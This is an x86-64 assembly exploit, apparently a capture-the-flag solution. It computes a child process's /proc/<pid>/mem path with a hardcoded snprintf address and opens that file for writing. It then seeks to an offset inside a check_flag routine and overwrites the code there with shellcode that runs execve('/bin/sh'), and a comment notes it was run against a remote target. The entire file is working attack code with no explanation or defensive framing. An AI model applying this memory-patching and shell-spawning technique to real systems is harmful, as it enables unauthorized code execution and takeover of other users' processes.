bits 64

write equ 1
open equ 2
lseek equ 8
execve equ 59
wait4 equ 61
O_WRONLY equ 1
SEEK_SET equ 0
snprintf equ 47e660h ; thanks for no PIE and linking snprintf
patch_offset equ 40223ah ; check_flag+8 (start of while loop body)

main:
    push rbp ; snprintf needs stack to be aligned, so we push something
    ; snprintf(child_mem_path_buf, sizeof(child_mem_path_buf), "/proc/%d/mem", pid)
    mov rax, snprintf
    lea rdi, [rel child_mem_path_buf]
    mov rsi, child_mem_path_buf_size
    lea rdx, [rel child_mem_path_fmt]
    mov ecx, DWORD [rbp-4] ; get pid from the stack
    call rax

    ; open(child_mem_path_buf, O_WRONLY)
    mov rax, open
    lea rdi, [rel child_mem_path_buf]
    mov rsi, O_WRONLY
    syscall

    mov r12, rax ; backup fd into r12
    ; lseek(fd, patch_offset, SEEK_SET)
    mov rax, lseek
    mov rdi, r12
    mov rsi, patch_offset
    mov rdx, SEEK_SET
    syscall

    ; write(fd, payload, payload_len)
    mov rax, write
    mov rdi, r12
    lea rsi, [rel payload]
    mov rdx, payload_len
    syscall

    infinite: jmp infinite ; for some reason this is needed for remote
    leave
    ret
    child_mem_path_fmt db "/proc/%d/mem", 0h
    child_mem_path_buf times 22 db 0h
    child_mem_path_buf_size equ $-child_mem_path_buf

payload:
    ; execve("/bin/sh", NULL, NULL);
    mov rax, execve
    lea rdi, [rel sh]
    xor rsi, rsi
    xor rdx, rdx
    syscall
    ret
    sh db "/bin/sh", 0h

payload_len equ $-payload